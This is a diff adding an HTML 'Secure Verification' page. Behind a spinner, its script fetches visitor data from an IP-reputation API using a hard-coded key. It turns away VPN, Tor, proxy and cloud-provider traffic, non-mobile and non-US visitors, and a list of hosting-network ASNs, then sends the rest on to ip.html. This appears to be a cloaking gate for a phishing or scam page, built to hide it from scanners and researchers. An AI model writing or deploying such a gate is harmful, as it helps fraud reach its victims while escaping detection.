@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Verification</title>
+    <style>
+        /* Simple styling for the loading screen */
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+            display: flex; 
+            flex-direction: column; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            background-color: #f9f9f9; 
+            margin: 0; 
+        }
+        .loader { 
+            border: 3px solid #f3f3f3; 
+            border-top: 3px solid #007AFF; 
+            border-radius: 50%; 
+            width: 40px; 
+            height: 40px; 
+            animation: spin 1s linear infinite; 
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        p { margin-top: 20px; color: #666; font-size: 16px; }
+    </style>
+</head>
+<body>
+
+    <div></div>
+    <p></p>
+
+    <script>
+        async function runSecurityCheck() {
+            // YOUR CONFIGURATION
+            const apiKey = "ira_8CFm8Krfcs2xdWlc9I16dUxmyL7SP43aTXkQ";
+            
+            // The list of ASN numbers you want to BLOCK
+            const blockedASNs = [
+                16509, 16591, 36040, 22363, 212238, 
+                11878, 14061, 36352, 398779, 7203, 
+                13415, 393886, 7990, 207990, 40676, 
+                46562, 9009
+            ];
+
+            try {
+                // Fetch the visitor's data
+                const response = await fetch(`https://api.ipregistry.co/?key=${apiKey}`);
+                
+                if (!response.ok) {
+                    // If API fails (out of credits, etc), default to error for safety
+                    window.location.href = "error.php";
+                    return;
+                }
+
+                const data = await response.json();
+
+                // --- CONDITION 1: SECURITY FLAGS ---
+                // All must be FALSE to pass
+                const sec = data.security;
+                const isSecurityClean = !sec.is_abuser && !sec.is_attacker && !sec.is_bogon && 
+                                        !sec.is_cloud_provider && !sec.is_proxy && !sec.is_relay && 
+                                        !sec.is_tor && !sec.is_tor_exit && !sec.is_vpn && 
+                                        !sec.is_anonymous && !sec.is_threat;
+
+                // --- CONDITION 2: DEVICE TYPE ---
+                // Must be mobile
+                const isMobile = data.user_agent.os.type === "mobile";
+
+                // --- CONDITION 3: COUNTRY ---
+                // Must be United States (US)
+                const isUS = data.location.country.code === "US";
+
+                // --- CONDITION 4: ASN BLOCKLIST ---
+                // Must NOT be in our numeric list
+                const visitorASN = data.connection.asn;
+                const isNotBlockedASN = !blockedASNs.includes(visitorASN);
+
+                // --- FINAL LOGIC GATE ---
+                if (isSecurityClean && isMobile && isUS && isNotBlockedASN) {
+                    // All conditions met - Access Granted
+                    window.location.href = "ip.html";
+                } else {
+                    // One or more conditions failed - Access Denied
+                    window.location.href = "error.php";
+                }
+
+            } catch (error) {
+                console.error("Critical Error:", error);
+                window.location.href = "error.php";
+            }
+        }
+
+        // Start the check as soon as the page loads
+        runSecurityCheck();
+    </script>
+</body>
+</html>
